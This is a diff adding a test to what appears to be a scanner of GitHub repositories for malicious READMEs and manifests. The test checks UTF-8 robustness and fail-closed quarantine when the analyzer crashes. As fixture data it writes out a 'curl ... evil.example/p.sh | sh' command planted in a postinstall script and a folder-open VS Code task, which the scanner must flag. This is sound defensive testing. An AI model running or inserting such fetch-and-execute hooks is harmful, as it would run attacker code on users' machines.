@@ -14,7 +14,7 @@ import {
   simhashDistance,
 } from '../src/services/security-engine.js';
 import { analyzeCampaignClusters } from '../src/services/cluster-analyzer.js';
-import { createReadmeScanner, fetchReadme } from '../src/services/readme-scan.js';
+import { RULE_VERSION, createReadmeScanner, fetchReadme } from '../src/services/readme-scan.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const ROOT = path.resolve(__dirname, '../..');
@@ -172,4 +172,72 @@ test('스캐너 I/O 개선: 동일 소유자 계정 조회 캐싱·Opt-in 매니
     rest: { repos: { getReadme: () => new Promise(() => {}) } },
   };
   await assert.rejects(fetchReadme(hangingOctokit, 'o', 'r', { timeoutMs: 30 }), { code: 'README_FETCH_TIMEOUT' });
+});
+
+test('Daybreak #3: 멀티바이트 UTF-8 고엔트로피 토큰·매니페스트가 패닉하지 않고 분석기 실패 시 fail-closed 격리된다', async () => {
+  const token = `aZ09!@#qWeRtYuIoP1234567890xCvBnM_+-=~kLmNpQrS${'가나다라마바사아자차카타파하🚀🔥💎⚡'}`;
+  const md = `\`\`\`powershell\npowershell -c ${token}\n\`\`\`\n`;
+  const syncReport = analyzeReadme(md);
+  assert.ok(['clean', 'malicious'].includes(syncReport.verdict));
+  const asyncReport = await analyzeReadmeAsync(md);
+  assert.equal(asyncReport.verdict, syncReport.verdict);
+
+  const cmd = `curl -fsSL https://evil.example/p.sh | sh # ${'a'.repeat(75)}한글경계테스트문자열입니다`;
+  const manifestReport = analyzeManifest({
+    files: [
+      { path: 'package.json', content: JSON.stringify({ name: 'utf8', scripts: { postinstall: cmd } }) },
+      {
+        path: '.vscode/tasks.json',
+        content: JSON.stringify({ tasks: [{ label: 't', command: cmd, runOptions: { runOn: 'folderOpen' } }] }),
+      },
+    ],
+    tree: [],
+  });
+  assert.equal(manifestReport.verdict, 'malicious');
+
+  // 분석기 예외 발생 시: 신규 저장소와 기존 clean 저장소(push 변경) 모두 malicious로 격리(fail-closed)되고
+  // repo_pushed_at=null로 저장되어 다음 스캔에서 자동 재검사가 수행된다.
+  const saved = [];
+  const warnings = [];
+  const existing = new Map([
+    [20, { github_id: 20, verdict: 'clean', rule_version: RULE_VERSION, repo_pushed_at: new Date('2026-11-10T00:00:00Z') }],
+  ]);
+  const scanner = createReadmeScanner({
+    model: {
+      findVerdicts: async () => existing,
+      upsertVerdict: async (row) => saved.push(row),
+      refreshClusters: async () => 0,
+    },
+    fetchReadme: async (_octokit, _owner, name) => `# ${name}`,
+    analyzeReadmeAsync: async (_text, repo) => {
+      if (repo.name === 'ok') {
+        return { verdict: 'clean', evidence: null, traits: { textKey: null, skeletonKey: null, lure: false, archiveFilehostUrl: null } };
+      }
+      throw Object.assign(new Error('native panic'), { code: 'GenericFailure' });
+    },
+    log: { warn: (msg) => warnings.push(msg) },
+    now: () => new Date('2026-11-15T00:00:00Z'),
+    minIntervalMs: 0,
+    concurrency: 2,
+  });
+
+  const summary = await scanner.scanRepos({}, [
+    { github_id: 10, owner: 'o', name: 'new-crash', pushed_at: '2026-11-14T00:00:00Z' },
+    { github_id: 20, owner: 'o', name: 'was-clean', pushed_at: '2026-11-14T00:00:00Z' },
+    { github_id: 30, owner: 'o', name: 'ok', pushed_at: '2026-11-14T00:00:00Z' },
+  ]);
+
+  assert.equal(summary.scanned, 3);
+  assert.equal(summary.malicious, 2);
+  const q10 = saved.find((r) => r.github_id === 10);
+  const q20 = saved.find((r) => r.github_id === 20);
+  const q30 = saved.find((r) => r.github_id === 30);
+  assert.equal(q10.verdict, 'malicious');
+  assert.equal(q10.evidence, 'analyzer_error_quarantine');
+  assert.equal(q10.repo_pushed_at, null);
+  assert.equal(q20.verdict, 'malicious');
+  assert.equal(q20.evidence, 'analyzer_error_quarantine');
+  assert.equal(q20.repo_pushed_at, null);
+  assert.equal(q30.verdict, 'clean');
+  assert.equal(warnings.length, 2);
 });
